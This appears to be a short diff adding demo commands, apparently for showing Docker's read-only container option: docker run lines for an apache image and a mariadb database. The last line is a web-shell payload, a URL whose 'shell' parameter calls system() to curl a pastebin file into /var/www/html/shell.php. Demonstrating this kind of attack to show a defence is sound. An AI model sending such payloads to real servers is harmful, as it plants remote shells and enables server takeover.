@@ -1,0 +1,4 @@
+docker run -p 80:80 --link db:db diogomonica/apache
+docker run -p 80:80 --link db:db -v /tmp/apache2:/var/run/apache2/ -v /tmp/apache:/var/lock/apache2/ --sig-proxy=false --read-only diogomonica/apache
+docker rm db; docker run -d --name db -e MYSQL_ROOT_PASSWORD=fake mariadb
+http://website/?shell=system(%27curl%20http://pastebin.com/raw.php?i=7RKWhNyT%20>%20/var/www/html/shell.php%27);
